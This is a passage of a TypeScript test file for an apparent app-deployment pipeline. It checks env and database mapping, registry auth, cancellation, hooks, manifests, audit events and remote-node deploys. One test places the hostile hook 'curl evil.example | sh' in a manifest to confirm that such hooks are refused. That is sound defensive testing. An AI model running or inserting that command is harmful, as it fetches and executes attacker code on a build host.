      { id: 1, databaseId: 10, envAlias: 'DB_URL' },
    ]);
    db.query.databases.findFirst.mockResolvedValueOnce({ id: 10, status: 'running' });

    await runDeployment(db as never, 1);

    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.env).toEqual({ FOO: 'dec:e1', BAR: 'dec:e2', DB_URL: 'postgres://db/app' });
    expect(h.connectionString).toHaveBeenCalledTimes(1);
    expect(h.connectionString).toHaveBeenCalledWith(expect.objectContaining({ id: 10 }));
    expect(h.decrypt).toHaveBeenCalledWith('e1');
  });

  it('reconciles durable Hub dependencies before loading runtime environment', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'wordpress:latest', templateId: 'wordpress' });
    db.query.deployments.findFirst.mockResolvedValue(dep);
    h.reconcileTemplateDependencies.mockResolvedValueOnce({
      database: { slug: 'wordpress-db' },
      alreadyAttached: false,
    });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(h.reconcileTemplateDependencies).toHaveBeenCalledWith(db, expect.objectContaining({ templateId: 'wordpress' }), expect.any(Function));
    expect(lines).toContain('##[stage:DEPENDENCIES:running] Reconciling managed template dependencies');
    expect(lines).toContain('Managed database wordpress-db is running and attached');
    expect(lines).toContain('##[stage:DEPENDENCIES:success]');

    h.reconcileTemplateDependencies.mockResolvedValueOnce(null);
    await runDeployment(db as never, 1);
  });

  it('maps managed database fields to application-specific template env vars', async () => {
    const { db } = makeDb();
    baseSetup(db, {
      templateDatabaseEnv: {
        WORDPRESS_DB_HOST: 'hostPort',
        WORDPRESS_DB_USER: 'username',
        WORDPRESS_DB_PASSWORD: 'password',
        WORDPRESS_DB_NAME: 'database',
      },
    });
    db.query.databaseAttachments.findMany.mockResolvedValue([
      { id: 1, databaseId: 10, envAlias: 'MYSQL_URL' },
    ]);
    db.query.databases.findFirst.mockResolvedValue({
      id: 10,
      engine: 'mysql',
      status: 'running',
      internalHost: 'nd-db-wordpress',
      internalPort: 3306,
      username: 'root',
      passwordEncrypted: 'db-secret',
      dbName: 'app',
    });

    await runDeployment(db as never, 1);

    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [{ env: Record<string, string> }];
    expect(ctx.env).toMatchObject({
      WORDPRESS_DB_HOST: 'nd-db-wordpress:3306',
      WORDPRESS_DB_USER: 'root',
      WORDPRESS_DB_PASSWORD: ['dec', 'db-secret'].join(':'),
      WORDPRESS_DB_NAME: 'app',
    });
    expect(ctx.env).not.toHaveProperty('MYSQL_URL');
  });

  it('recovers a missing Ghost mapping from the trusted bundled runtime contract', async () => {
    const { db } = makeDb();
    baseSetup(db, {
      image: 'ghost:5-alpine',
      port: 2368,
      volumeMount: '/var/lib/ghost/content',
      templateDatabaseEnv: { DATABASE_URL: 'url' },
    });
    db.query.databaseAttachments.findMany.mockResolvedValue([
      { id: 1, databaseId: 10, envAlias: 'DATABASE_URL' },
    ]);
    db.query.databases.findFirst.mockResolvedValue({
      id: 10,
      engine: 'mysql',
      status: 'running',
      containerName: 'nd-db-ghost-db',
      internalHost: 'nd-db-ghost-db',
      internalPort: 3306,
      username: 'root',
      passwordEncrypted: 'ghost-db-secret',
      dbName: 'app',
    });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [{ env: Record<string, string> }];
    expect(ctx.env).toMatchObject({
      database__connection__host: 'nd-db-ghost-db',
      database__connection__port: '3306',
      database__connection__user: 'root',
      database__connection__password: ['dec', 'ghost-db-secret'].join(':'),
      database__connection__database: 'app',
    });
    expect(ctx.env).not.toHaveProperty('DATABASE_URL');
    expect(lines).toContain(
      'Managed database environment ready: database__connection__database, database__connection__host, database__connection__password, database__connection__port, database__connection__user',
    );
  });

  it('fails before container startup when an attached database is not running', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'ghost:5-alpine' });
    db.query.databaseAttachments.findMany.mockResolvedValue([
      { id: 1, databaseId: 10, envAlias: 'DATABASE_URL' },
    ]);
    db.query.databases.findFirst.mockResolvedValue({ id: 10, engine: 'mysql', status: 'error' });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
    expect(lines).toContain('✗ Deployment failed: Managed database dependency is not ready (0/1 attachments running)');
  });

  // ── private-registry auth ────────────────────────────────────────────────
  it('resolves registry auth from a registry-type source for image deploys', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'ghcr.io/acme/app:1', sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({
      id: 7, type: 'registry', registryUsername: 'ci', tokenEncrypted: 'tok-enc',
    });

    await runDeployment(db as never, 1);

    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.registryAuth).toEqual({ username: 'ci', password: 'dec:tok-enc', server: 'ghcr.io' });
  });

  it('derives no server for bare image names and skips incomplete credentials', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({
      id: 7, type: 'registry', registryUsername: 'ci', tokenEncrypted: null,
    });
    await runDeployment(db as never, 1);
    let [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.registryAuth).toBeUndefined();

    // A non-registry source and a missing source row behave the same.
    h.builder.buildAndRun.mockClear();
    db.query.sources.findFirst.mockResolvedValue({ id: 8, type: 'github', registryUsername: 'ci', tokenEncrypted: 'x' });
    await runDeployment(db as never, 1);
    [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.registryAuth).toBeUndefined();

    h.builder.buildAndRun.mockClear();
    db.query.sources.findFirst.mockResolvedValue(undefined);
    await runDeployment(db as never, 1);
    [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.registryAuth).toBeUndefined();
  });

  it('skips registry auth for repo deploys even with a registry source', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: null, sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({ id: 7, type: 'registry', registryUsername: 'u', tokenEncrypted: 't' });
    await runDeployment(db as never, 1);
    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.registryAuth).toBeUndefined();
  });

  it('hands the builder no agent seam — remote deploys are refused, not routed', async () => {
    // This used to assert that `agentCall` was bound for a remote service,
    // which read as "remote deploys work". Nothing ever consumed the binding,
    // so the deploy ran on the panel host; the pipeline now refuses it
    // outright (see "runDeployment refuses a remote-server target") and the
    // seam is re-bound by whichever change teaches a builder to use it.
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', serverId: null });
    h.builder.buildAndRun.mockClear();

    await runDeployment(db as never, 1);

    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.agentCall).toBeUndefined();
    expect(ctx.serverId).toBeUndefined();
    expect(h.agentOp).not.toHaveBeenCalled();
  });

  it('detects registry hosts with a port and skips Docker Hub names', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'registry.local:5000/app:1', sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({ id: 7, type: 'registry', registryUsername: 'u', tokenEncrypted: 't' });
    await runDeployment(db as never, 1);
    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.registryAuth).toMatchObject({ server: 'registry.local:5000' });

    // org/app (no dot in the first segment) → no server, Docker Hub default.
    h.builder.buildAndRun.mockClear();
    baseSetup(db, { image: 'acme/app:1', sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({ id: 7, type: 'registry', registryUsername: 'u', tokenEncrypted: 't' });
    await runDeployment(db as never, 1);
    const [ctx2] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx2.registryAuth).toMatchObject({ server: undefined });
  });

  it('covers null registryUsername and port-style bare image names', async () => {
    const { db } = makeDb();
    // registryUsername null → username '' → auth skipped (incomplete).
    baseSetup(db, { image: 'reg.io/app:1', sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({ id: 7, type: 'registry', registryUsername: null, tokenEncrypted: 't' });
    await runDeployment(db as never, 1);
    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.registryAuth).toBeUndefined();

    // A bare name with a single segment: split('/')[0] is the whole name.
    h.builder.buildAndRun.mockClear();
    baseSetup(db, { image: 'app:1', sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({ id: 7, type: 'registry', registryUsername: 'u', tokenEncrypted: 't' });
    await runDeployment(db as never, 1);
    const [ctx2] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx2.registryAuth).toMatchObject({ server: undefined });
  });

  // ── cancellation ─────────────────────────────────────────────────────────
  it('aborts before the build when the deployment was cancelled mid-flight', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { image: 'nginx:latest' });
    // First read: the pipeline's initial fetch. Subsequent reads (checkpoints)
    // observe the cancel route's write.
    db.query.deployments.findFirst
      .mockResolvedValueOnce(dep)
      .mockResolvedValue({ ...dep, status: 'cancelled' });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
    expect(lines.join('\n')).toContain('⏹ Deployment cancelled');
    // No previous runtime → the service is idle, the deployment cancelled.
    const svcUpdate = updates.find((u) => u.table === services && u.values.status === 'idle');
    expect(svcUpdate).toBeTruthy();
    const depUpdate = updates.find((u) => u.table === deployments && u.values.status === 'cancelled');
    expect(depUpdate?.values.finishedAt).toBeInstanceOf(Date);
  });

  it('cancelling with a healthy previous runtime keeps the old version serving', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { image: 'nginx:latest', runtimeId: 'old-c' });
    // Reads: 1 = initial fetch, 2 = pre-build checkpoint, 3 = post-checkout
    // checkpoint (still in-flight); 4+ = the cancel is visible post-build.
    db.query.deployments.findFirst
      .mockResolvedValueOnce(dep)
      .mockResolvedValueOnce(dep)
      .mockResolvedValueOnce(dep)
      .mockResolvedValue({ ...dep, status: 'cancelled' });
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'new-c', port: 3000, healthPath: '/' }));
    h.builder.isHealthy.mockImplementation(async (runtime: { runtimeId: string }) => runtime.runtimeId === 'old-c');
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines.join('\n')).toContain('⏹ Deployment cancelled');
    expect(lines.join('\n')).toContain('↩ Previous runtime is still healthy — rolled back to it.');
    // The new runtime was retired, the service stays running.
    expect(h.builder.stop).toHaveBeenCalledWith('new-c');
    const svcUpdate = updates.find((u) => u.table === services && u.values.status === 'running');
    expect(svcUpdate).toBeTruthy();
  });

  it('a cancel landing just before the finalize write retires the new container', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', runtimeId: 'old-c' });
    db.query.deployments.findFirst.mockResolvedValue(dep);
    // …but the conditional finalize update (status running + imageDigest set)
    // returns no rows — as if the cancel flipped the row between checkpoint and write.
    const dbAny = db as unknown as {
      update: (t: unknown) => { set: (v: Record<string, unknown>) => { where: () => { returning: () => Promise<unknown[]> } } };
    };
    const origUpdate = dbAny.update.bind(dbAny);
    dbAny.update = ((table: unknown) => {
      const builder = origUpdate(table);
      return {
        set: (values: Record<string, unknown>) => {
          const inner = builder.set(values);
          if (values.status === 'running' && 'imageDigest' in values) {
            return { where: () => ({ returning: () => Promise.resolve([]) }) };
          }
          return inner;
        },
      };
    }) as typeof dbAny.update;
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'new-c', port: 3000, healthPath: '/' }));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    const text = lines.join('\n');
    expect(text).toContain('Cancelled just before finalizing');
    expect(h.builder.stop).toHaveBeenCalledWith('new-c');
  });

  it('cancels a repo deploy at the post-checkout checkpoint', async () => {
    const { db } = makeDb();
    baseSetup(db, { repoUrl: 'https://github.com/a/b.git' });
    // Reads: 1 = initial, 2 = pre-build checkpoint; 3 = post-checkout → cancelled.
    db.query.deployments.findFirst
      .mockResolvedValueOnce(dep)
      .mockResolvedValueOnce(dep)
      .mockResolvedValue({ ...dep, status: 'cancelled' });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(h.checkoutCommit).toHaveBeenCalledTimes(1);
    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
    expect(lines.join('\n')).toContain('⏹ Deployment cancelled');
  });

  it('cancels after a passing healthcheck, just before the success writes', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest' });
    // Reads: 1 initial, 2 pre-build, 3 post-checkout, 4 post-build; 5 = final checkpoint.
    db.query.deployments.findFirst
      .mockResolvedValueOnce(dep)
      .mockResolvedValueOnce(dep)
      .mockResolvedValueOnce(dep)
      .mockResolvedValueOnce(dep)
      .mockResolvedValue({ ...dep, status: 'cancelled' });
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'new-c', port: 3000, healthPath: '/' }));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    // The healthcheck ran; the success path never executed.
    expect(lines.join('\n')).toContain('Running healthcheck');
    expect(lines.join('\n')).toContain('⏹ Deployment cancelled');
    expect(lines.join('\n')).not.toContain('✓ Deployment successful');
  });

  it('a finalize-race cancel without a previous runtime leaves the service untouched', async () => {    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', runtimeId: null });
    db.query.deployments.findFirst.mockResolvedValue(dep);
    const dbAny = db as unknown as {
      update: (t: unknown) => { set: (v: Record<string, unknown>) => { where: () => { returning: () => Promise<unknown[]> } } };
    };
    const origUpdate = dbAny.update.bind(dbAny);
    dbAny.update = ((table: unknown) => {
      const builder = origUpdate(table);
      return {
        set: (values: Record<string, unknown>) => {
          const inner = builder.set(values);
          if (values.status === 'running' && 'imageDigest' in values) {
            return { where: () => ({ returning: () => Promise.resolve([]) }) };
          }
          return inner;
        },
      };
    }) as typeof dbAny.update;
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'new-c', port: 3000, healthPath: '/' }));
    // A failing stop must be swallowed by the cancellation cleanup path.
    h.builder.stop.mockRejectedValueOnce(new Error('docker gone'));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines.join('\n')).toContain('Cancelled just before finalizing');
    expect(h.builder.stop).toHaveBeenCalledWith('new-c');
  });

  it('executes preDeployCmd, postDeployCmd and preStopCmd hooks during deployment', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', runtimeId: 'old-c' });
    db.query.deployments.findFirst.mockResolvedValue(dep);
    const configRow = {
      id: 1,
      serviceId: 5,
      buildPack: 'auto',
      baseDir: '/',
      installCmd: null,
      buildCmd: null,
      startCmd: null,
      dockerfilePath: null,
      preDeployCmd: 'npm run db:migrate',
      postDeployCmd: 'curl -sSL http://localhost/warmup',
      preStopCmd: 'npm run drain',
      restartPolicy: 'unless-stopped',
      stopGraceSeconds: 5,
      createdAt: new Date(0),
      updatedAt: new Date(0),
    };
    db.query.buildConfigs.findFirst.mockResolvedValue(configRow);

    const lines = collectLogs(1);
    await runDeployment(db as never, 1);

    expect(execMock.run).toHaveBeenCalledWith(
      'npm',
      ['run', 'db:migrate'],
      expect.any(Object),
      expect.any(Function),
    );
    expect(execMock.run).toHaveBeenCalledWith(
      'curl',
      ['-sSL', 'http://localhost/warmup'],
      expect.any(Object),
      expect.any(Function),
    );
    expect(execMock.run).toHaveBeenCalledWith(
      'npm',
      ['run', 'drain'],
      expect.any(Object),
      expect.any(Function),
    );
    expect(lines.join('\n')).toContain('Running Pre-Deploy Hook: npm run db:migrate');
    expect(lines.join('\n')).toContain('Running Post-Deploy Hook: curl -sSL http://localhost/warmup');
    expect(lines.join('\n')).toContain('Running Pre-Stop Hook: npm run drain');
    // Pre-deploy hook failure causes deploy to fail and rollback
    execMock.run.mockRejectedValueOnce(new Error('migration failed'));
    await runDeployment(db as never, 1);
    expect(lines.join('\n')).toContain('✗ Deployment failed: migration failed');

    // Post-deploy hook failure is logged but does not fail the deploy
    execMock.run.mockResolvedValueOnce({ stdout: '', stderr: '' });
    execMock.run.mockRejectedValueOnce(new Error('warmup timed out'));
    await runDeployment(db as never, 1);
    expect(lines.join('\n')).toContain('warning: post-deploy hook failed: warmup timed out');

    // Pre-stop hook failure is logged as warning during finalize
    execMock.run.mockResolvedValueOnce({ stdout: '', stderr: '' }); // pre-deploy ok
    execMock.run.mockResolvedValueOnce({ stdout: '', stderr: '' }); // post-deploy ok
    execMock.run.mockRejectedValueOnce(new Error('drain failed')); // pre-stop fails
    await runDeployment(db as never, 1);
    expect(lines.join('\n')).toContain('pre-stop warning: drain failed');

    // Whitespace hook command returns early
    configRow.preDeployCmd = '   ';
    await runDeployment(db as never, 1);
  });
});

describe('runDeployment finalize: blue-green vs in-place redeploys', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    logBus.removeAllListeners();
    h.config.wildcardDomain = '';
    h.builder.isHealthy.mockImplementation(async () => true);
    h.builder.stop.mockImplementation(async () => undefined);
    h.checkoutCommit.mockImplementation(async () => 'sha-1234567');
    h.writeDynamicConfig.mockImplementation(async () => undefined);
  });

  afterEach(() => {
    logBus.removeAllListeners();
  });

  it('an in-place redeploy (compose) must NOT retire the runtime id that just went live', async () => {
    const { db, updates } = makeDb();
    // The service row still carries the deterministic compose runtime id and
    // buildAndRun recreates containers under that SAME id — "previous" and
    // "new" are one live instance.
    baseSetup(db, { type: 'docker', status: 'running', runtimeId: 'ndcmp-stack-api-1' });
    h.builder.buildAndRun.mockImplementation(async () => ({
      runtimeId: 'ndcmp-stack-api-1',
      port: 3000,
      healthPath: '/',
    }));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(h.writeDynamicConfig).toHaveBeenCalled();
    expect(h.builder.stop).not.toHaveBeenCalled();
    expect(lines).toContain('In-place redeploy: the live instance carries the new version — nothing to retire');
    const svcRunning = updates.filter((u) => u.table === services && u.values.status === 'running').at(-1);
    expect(svcRunning?.values.runtimeId).toBe('ndcmp-stack-api-1');
  });

  it('blue-green finalizes still retire the previous container after routing flips', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { type: 'docker', status: 'running', runtimeId: 'c-old' });
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'c-new', port: 3000, healthPath: '/' }));

    await runDeployment(db as never, 1);

    expect(h.writeDynamicConfig).toHaveBeenCalled();
    expect(h.builder.stop).toHaveBeenCalledWith('c-old', { graceSeconds: undefined });
    expect(h.builder.stop).not.toHaveBeenCalledWith('c-new', expect.anything());
    const svcRunning = updates.filter((u) => u.table === services && u.values.status === 'running').at(-1);
    expect(svcRunning?.values.runtimeId).toBe('c-new');
  });
});

// ── `.ninedeploy` build-shaping sections ───────────────────────────────────
//
// Until 0.3.5 the pipeline applied only the manifest's OPERATIONAL sections
// (routes/database/alerts) and dropped `build`, `run`, `resources` and
// `env.required` on the floor, even though the schema, the CLI validator and
// the web Manifest Creator all accepted them.
describe('runDeployment applies the .ninedeploy build sections', () => {
  /** Write a manifest (one YAML line per array entry) into the work dir. */
  function writeManifest(lines: string[]) {
    const dir = path.join(reposDir, '5');
    mkdirSync(dir, { recursive: true });
    writeFileSync(path.join(dir, '.ninedeploy'), lines.join('\n'), 'utf8');
  }

  const BUILD_CONFIG = {
    id: 1,
    serviceId: 5,
    buildPack: 'auto',
    baseDir: '/',
    installCmd: null,
    buildCmd: null,
    startCmd: null,
    dockerfilePath: null,
    preDeployCmd: null,
    postDeployCmd: null,
    preStopCmd: null,
    restartPolicy: 'unless-stopped',
    stopGraceSeconds: 5,
  };

  const repoService = { image: null, repoUrl: 'https://example.test/app.git' };

  it('folds build commands into the BuildContext and hands the manifest to the builder', async () => {
    writeManifest(['version: "1"', 'build:', '  install: npm ci', '  start: node server.js']);
    const { db } = makeDb();
    baseSetup(db, repoService);
    db.query.buildConfigs.findFirst.mockResolvedValue(BUILD_CONFIG);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as {
      buildConfig: Record<string, unknown>;
      manifest?: Record<string, unknown>;
    };
    expect(ctx.buildConfig).toMatchObject({ installCmd: 'npm ci', startCmd: 'node server.js' });
    // The raw manifest travels too: `runtime`/`phases` cannot be expressed as
    // a BuildConfig and are rendered into nixpacks.toml by the builder.
    expect(ctx.manifest).toMatchObject({ version: '1' });
    expect(lines.some((l) => l.includes('.ninedeploy build config'))).toBe(true);
  });

  it('lets a panel value win over the manifest', async () => {
    writeManifest(['version: "1"', 'build:', '  install: npm ci']);
    const { db } = makeDb();
    baseSetup(db, repoService);
    db.query.buildConfigs.findFirst.mockResolvedValue({ ...BUILD_CONFIG, installCmd: 'pnpm i' });

    await runDeployment(db as never, 1);

    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { buildConfig: Record<string, unknown> };
    expect(ctx.buildConfig.installCmd).toBe('pnpm i');
  });

  it('fills resources and run.port only where the panel left them unset', async () => {
    writeManifest([
      'version: "1"',
      'run:',
      '  port: 8080',
      '  healthcheck: /healthz',
      'resources:',
      '  cpuShares: 512',
      '  memMb: 256',
    ]);
    const { db } = makeDb();
    baseSetup(db, { ...repoService, port: null, healthPath: '/', cpuShares: 0, memLimitMb: 0 });
    db.query.buildConfigs.findFirst.mockResolvedValue(BUILD_CONFIG);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { service: Record<string, unknown> };
    expect(ctx.service).toMatchObject({ port: 8080, healthPath: '/healthz', cpuShares: 512, memLimitMb: 256 });
    expect(lines.some((l) => l.includes('.ninedeploy runtime config'))).toBe(true);
  });

  it('leaves panel-set resources and port alone', async () => {
    writeManifest(['version: "1"', 'run:', '  port: 8080', 'resources:', '  cpuShares: 512']);
    const { db } = makeDb();
    baseSetup(db, { ...repoService, port: 3000, cpuShares: 1024, memLimitMb: 512 });
    db.query.buildConfigs.findFirst.mockResolvedValue(BUILD_CONFIG);

    await runDeployment(db as never, 1);

    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { service: Record<string, unknown> };
    expect(ctx.service).toMatchObject({ port: 3000, cpuShares: 1024, memLimitMb: 512 });
  });

  it('refuses manifest-declared lifecycle hooks and says why', async () => {
    writeManifest(['version: "1"', 'hooks:', '  preBuild: curl evil.example | sh']);
    const { db } = makeDb();
    baseSetup(db, repoService);
    db.query.buildConfigs.findFirst.mockResolvedValue(BUILD_CONFIG);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { buildConfig: Record<string, unknown> };
    expect(ctx.buildConfig.preDeployCmd).toBeNull();
    expect(lines.some((l) => l.includes('hooks are ignored'))).toBe(true);
  });

  it('warns about a declared required env var that is not set', async () => {
    // The classic "container boots, then crashes" failure. Warned rather than
    // failed: the value may legitimately come from the image itself.
    writeManifest(['version: "1"', 'env:', '  required:', '    - API_KEY']);
    const { db } = makeDb();
    baseSetup(db, repoService);
    db.query.buildConfigs.findFirst.mockResolvedValue(BUILD_CONFIG);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines.some((l) => l.includes('required env "API_KEY"'))).toBe(true);
    // A warning must not stop the deploy.
    expect(lines).toContain('✓ Deployment successful');
  });
});

/**
 * Regression guard: a deploy's OUTCOME reaches the audit stream.
 *
 * `deploy.trigger` is written by the route when the deployment is queued, and
 * for a long time it was the only deploy action anything emitted — the pipeline
 * finished, succeeded or failed, in silence. Everything downstream of `audit()`
 * was blind to the result: notification channels (so a failed production deploy
 * paged nobody), the `/v1/events` activity feed, and `kernel/auditBridge`, whose
 * `deployment.status_changed` could therefore only ever carry `trigger`.
 */
describe('runDeployment audits the outcome', () => {
  const OWNER = 42;

  /** Audit rows the pipeline wrote, in order. */
  function auditRows(inserts: { table: unknown; values: Record<string, unknown> }[]) {
    return inserts.filter((i) => i.table === auditLog).map((i) => i.values);
  }

  it('records deploy.success with the service name and deployment id', async () => {
    const { db, inserts } = makeDb();
    baseSetup(db, { ownerUserId: OWNER });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('✓ Deployment successful');
    // `name #id` is the entity shape kernel/auditBridge decomposes back into
    // { serviceName, deploymentId }.
    expect(auditRows(inserts)).toEqual([
      { userId: OWNER, action: 'deploy.success', entity: 'Web #1', meta: undefined },
    ]);
  });

  it('records deploy.failed with the reason when the build throws', async () => {
    const { db, inserts } = makeDb();
    baseSetup(db, { ownerUserId: OWNER });
    h.builder.buildAndRun.mockRejectedValueOnce(new Error('image pull failed'));
    collectLogs(1);

    await runDeployment(db as never, 1);

    expect(auditRows(inserts)).toEqual([
      { userId: OWNER, action: 'deploy.failed', entity: 'Web #1', meta: { reason: 'image pull failed' } },
    ]);
  });

  it('records deploy.cancelled without a reason', async () => {
    const { db, inserts } = makeDb();
    baseSetup(db, { ownerUserId: OWNER });
    // The first cancel checkpoint reads the deployment row back.
    db.query.deployments.findFirst
      .mockResolvedValueOnce(dep)
      .mockResolvedValue({ ...dep, status: 'cancelled' });
    collectLogs(1);

    await runDeployment(db as never, 1);

    expect(auditRows(inserts)).toEqual([
      { userId: OWNER, action: 'deploy.cancelled', entity: 'Web #1', meta: undefined },
    ]);
  });

  it('falls back to a null actor when the service has no owner', async () => {
    // `ownerUserId` is nullable (ON DELETE SET NULL). A null actor makes the
    // event operator-only on the /v1/events socket, which is the safe default.
    const { db, inserts } = makeDb();
    baseSetup(db, { ownerUserId: null });
    collectLogs(1);

    await runDeployment(db as never, 1);

    expect(auditRows(inserts)[0]).toMatchObject({ userId: null, action: 'deploy.success' });
  });

  it('records deploy.failed for an unknown service type', async () => {
    const { db, inserts } = makeDb();
    baseSetup(db, { ownerUserId: OWNER, type: 'nonsense' });
    collectLogs(1);

    await runDeployment(db as never, 1);

    expect(auditRows(inserts)).toEqual([
      { userId: OWNER, action: 'deploy.failed', entity: 'Web #1', meta: { reason: 'Unknown service type: nonsense' } },
    ]);
  });
});

describe('runDeployment with an inline compose stack', () => {
  const stack = [
    'services:',
    '  app:',
    '    image: nginx:alpine',
  ].join('\n');

  it('skips the git checkout and rewrites the compose file from the service row', async () => {
    const { db } = makeDb();
    // An inline stack has no repository and no image: without the
    // composeContent branch, PREPARE would call checkoutCommit('') and the
    // deploy would die before the builder ever ran.
    baseSetup(db, { type: 'compose', repoUrl: null, image: null, composeContent: stack, composeService: 'app' });
    collectLogs(1);
    // Mocks are file-scoped and this suite runs last; clear the history so the
    // "never checked out" assertion is about THIS deployment.
    h.checkoutCommit.mockClear();
    h.builder.buildAndRun.mockClear();

    await runDeployment(db as never, 1);

    expect(h.checkoutCommit).not.toHaveBeenCalled();
    // The workspace copy is a cache of the row — asserting the FILE (not just
    // that a helper exists) is what proves the pipeline is actually wired to
    // rewrite it before every deploy.
    const written = readFileSync(path.join(reposDir, '5', 'docker-compose.yml'), 'utf8');
    expect(written).toBe(stack);
    expect(h.builder.buildAndRun).toHaveBeenCalled();
  });

  it('repairs a workspace whose compose file was deleted between deploys', async () => {
    const { db } = makeDb();
    baseSetup(db, { type: 'compose', repoUrl: null, image: null, composeContent: stack, composeService: 'app' });
    collectLogs(1);
    rmSync(path.join(reposDir, '5'), { recursive: true, force: true });

    await runDeployment(db as never, 1);

    expect(readFileSync(path.join(reposDir, '5', 'docker-compose.yml'), 'utf8')).toBe(stack);
  });
});

describe('runDeployment on a remote-server target', () => {
  /**
   * Make the mocked agent answer `docker.inspect --format state` with a
   * running container, so the remote builder's state-based health check
   * settles instead of polling to its deadline.
   */
  const agentAnswersRunning = () => {
    h.agentOp.mockImplementation(async (_db: unknown, _serverId: unknown, op: string) =>
      op === 'docker.inspect'
        ? { exitCode: 0, lines: ['running|172.18.0.9'] }
        : { exitCode: 0, lines: [] },
    );
  };

  /**
   * r037. `server_id` existed on the services table, on the Servers page and
   * in the BuildContext, and no builder read it — so a service pinned to a
   * node would have been built and started on the PANEL host while the panel
   * reported the node. It is now routed through the node's agent.
   */
  it('runs a docker service through the node agent, never the local builder', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', serverId: 4 });
    collectLogs(1);
    h.builder.buildAndRun.mockClear();
    agentAnswersRunning();

    await runDeployment(db as never, 1);

    // The LOCAL docker builder must not have touched this deployment.
    expect(h.builder.buildAndRun).not.toHaveBeenCalled();

    const ops = h.agentOp.mock.calls.map((c) => (c as unknown[])[2] as string);
    expect(ops).toContain('docker.pull');
    expect(ops).toContain('file.writeEnv');
    expect(ops).toContain('docker.runEnv');
    // Every call is addressed to the node the service is pinned to.
    for (const call of h.agentOp.mock.calls) {
      expect((call as unknown[])[1]).toBe(4);
    }
  });

  it('deletes the env file from the node after the container has taken it', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', serverId: 4 });
    collectLogs(1);
    agentAnswersRunning();

    await runDeployment(db as never, 1);

    const ops = h.agentOp.mock.calls.map((c) => (c as unknown[])[2] as string);
    // Leaving decrypted service secrets on the node's disk after `docker run`
    // has consumed them is pure exposure.
    expect(ops.indexOf('file.deleteEnv')).toBeGreaterThan(ops.indexOf('docker.runEnv'));
  });

  it('refuses a pm2 service on a node instead of running it on the panel host', async () => {
    const { db, inserts } = makeDb();
    baseSetup(db, { ownerUserId: 42, type: 'pm2', serverId: 4 });
    const lines = collectLogs(1);
    h.builder.buildAndRun.mockClear();
    h.agentOp.mockClear();

    await runDeployment(db as never, 1);

    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
